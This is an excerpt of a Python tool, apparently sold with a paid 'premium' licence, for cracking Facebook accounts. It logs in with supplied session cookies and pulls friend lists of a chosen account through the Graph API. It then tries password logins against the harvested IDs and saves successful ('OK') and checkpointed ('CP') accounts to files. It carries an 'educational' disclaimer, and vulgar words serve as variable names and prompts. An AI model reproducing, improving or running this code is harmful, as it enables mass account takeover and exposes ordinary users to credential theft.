    ...
    if len(OK) != 0 or len(cp) != 0:
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ...
                print("\n")
                if len(pwBar) <= 5:
                    print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(O,H,O))
                else:
                    pwBaru.append(pwBar)
            for memek in cp:
                kontol = memek.replace('\n', '')
                titid  = kontol.split('|')
                jalan(f' {N}[{M}>{N}] trying to login to the account : {K}{kontol.replace(" [×] ", "")}{N}')
                try:
            ...
            input(' [ %sRETURN%s ] '%(O,H));moch_yayan()
        elif cek_cp in["T","t"]:
            exit(f"\n  {O}*{N} goodbye:)")
        else:
            print(f"\n [{M}!{N}] Y/t goblok");hasil(ok,cp)
    else:
        print('\n\n [%s!%s] opps you are not getting results :('%(M,N));exit()

#MASUK TOKEN
def yayanxd():
    os.system('clear')
    print (' %s*%s this tool uses facebook cookies login.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
    cookie = input("\n %s[%s?%s] Cookies : %s"% (O,H,O,H))
    if cookie in['OPEN','Open','open']:
      jalan("\n  %s* %You will be redirected to Group"%(O,H));time.sleep(3);os.system('xdg-open https://wa.me/+2348069472717');yayanxd()
    try:
        ...
        print('\n\n %s*%s Welcome %s%s%s'%(O,H,O,nama,N));time.sleep(2)
        print(' %s*%s This Tool Is For Educational Reasons We Are Not Responsible For Any Misused...'%(O,H));time.sleep(2)
        input(' %s*%s press enter '%(O,H))
        os.system('xdg-open https://chat.whatsapp.com/LOL8pfMCqPj17AEynIrwVO')
        moch_yayan()
    except AttributeError:
        print('\n %s[%s×%s] cookies invalid'%(O,H,O));time.sleep(1);yayanxd()
...
def moch_yayan():
    ...
    try:
        ...
        tod = req['pay_key'].replace("PREMIUM", "\x1b[1;92mPAID\x1b[0m").replace("Trial", "\x1b[1;92mNot\x1b[0m")
        todz = req['pay_key']
        notice = req['text']
        statuz = req["status"]
        if statuz == 'expired':
    ...
    IP = ipm["origin"]
    print("\n[00] ADDRESS      : %s"%(mail));time.sleep(0.03)
    print(f"[5] CREATION  : {bergabung}");time.sleep(0.03)
    print("[4] ---------------------------------------------");time.sleep(0.03)
    print(f"[3] PREMIUM    : {tod}")
    print(f"[2] EXPIRED : {kadaluarsa} {H}{notice}{N}");time.sleep(0.03)
    print("[1] ---------------------------------------------");time.sleep(0.03)
    print(f"[0]  IP ADDRESS     : %s\n"%(IP));time.sleep(0.05)
    try:
    ...
    kueh  = {"cookie":cookiz}
    print('[%s1%s].---------------------------------------------[0]'%(O,H));time.sleep(0.03) 
    print('[%s2%s].     CHIGOZIEWORLDWIDE         '%(O,H));time.sleep(0.03)
    print('[%s3%s].---------------------------------------------[0]'%(O,H));time.sleep(0.03)
    print(" [ ACCOUNT ACTIVATED ] %s%s%s ]\n"%(H,nama,H));time.sleep(0.03)
    print(' [%s1%s]. CLONE FROM GP'%(O,H));time.sleep(0.03)
    print(' [%s2%s]. CLONE FROM PB'%(O,H));time.sleep(0.03)
    print(' [%s3%s]. CLONE FROM FL'%(O,H));time.sleep(0.03)
    print(' [%s4%s]. CLONE FROM LK'%(O,H));time.sleep(0.03)
    print(' [%s5%s]. CLONE FROM MULTI ID'%(O,H));time.sleep(0.03)
    print(' [%s6%s]. CLONE FROM PT'%(O,H));time.sleep(0.03)
    print(' [%s7%s]. CHECK CHECKPOINT DET'%(O,H));time.sleep(0.03)
    print(' [%s8%s]. SETTINGS USER agent'%(O,H));time.sleep(0.03)
    print(' [%s9%s]. CHECK CRACK results'%(O,H));time.sleep(0.03)
    print(' [%s00%s].UPGRADE License%s premium%s'%(O,H,O,H));time.sleep(0.03)
    ...
    if pepek == '':
        ...
        if todz == 'Trial':
            ...
            try:
                print("\n [#] INPUT ID")
                user = input(' [1] ENTER ID NUMBER : ')
                _memek_ = __convert__(user)
                for a in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s'%(_memek_.get('_kontol_'),tokenz)).json()["data"]:
                    id.append(a['id'] + '<=>' + a['name'])
            except KeyError:
                print('\n %s[%s×%s] This ID Is Not A Public Id Number'%(O,H,O));time.sleep(3);moch_yayan()
    elif pepek in['3','03']:
        if todz == 'Trial':
            jalan(f"\n{N} [{M}×{N}] you are a trial user, you can only use the number menu {H}02.{H} upgrade ke premium untuk menikmati semua fiture...");exit()
        else:
        ...
        file = input("\n [%s?%s] enter filename :%s "%(O,H,O))
        if file == "":
            file = input("\n %s[%s?%s] enter filename :%s %s"%(O,H,O,H,O))
        total = open("results/%s"%(file)).read().splitlines()
        print(" %s[%s#%s] --------------------------------------------"%(O,H,O));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(O,H,O,H,O,H,hps_nm,O,H,O,len(total),O))
        print(" %s[%s#%s] --------------------------------------------"%(O,H,O));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
        ...
        print(" %s[%s#%s] --------------------------------------------"%(O,H,O))
        input('\n  [ %sRETURN%s ] '%(O,H));moch_yayan()
    elif pepek in['10']:
        jalan(f"\n {H}  >>> Get premium users to enjoy all the features!!<<<{N}\n")
        upd = input(" [?] do you want to upgrade to premium? [Y/t]: ")
        if upd =="":
            exit(f"{N}[{M}×{N}] Y/t memek!")
        elif upd in["Y","y"]:
            jalan("\n %s* %sYou will be redirected to whatsapp..."%(O,H));time.sleep(0.02)
...
def _ngocok_(__ppk__):
    ...
    for mnh in range(nanya_keun):
        ...
        try:
            ...
            print('\n [×] failed to retrieve id, probably id is not public');time.sleep(3);moch_yayan()
...
class __crack__:
    ...
    def plerr(self,id):
        ...
        if ___yayanganteng___ in ('Y', 'y'):
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            print('\n %s[%s×%s] correct input'%(O,H,O));__yan__()
            ...
            print('\n %s[%s×%s] y/t stupid!'%(O,H,O));self.plerr(id)
...
#    <- Bot followers ->
    ...
    def __pler__(self):
        yan = input('\n [*] method : ')
        if yan == '':
            print('\n %s[%s×%s] dont be empty bro'%(O,H,O));self.__pler__()
        elif yan in ('1', '01'):
            print('\n [%s+%s] CP result saved to -> results/OK-%s-%s-%s.txt'%(O,H,ha, op, ta))
            print(' [%s+%s] CP result saved to -> results/CP-%s-%s-%s.txt'%(O,H,ha, op, ta))
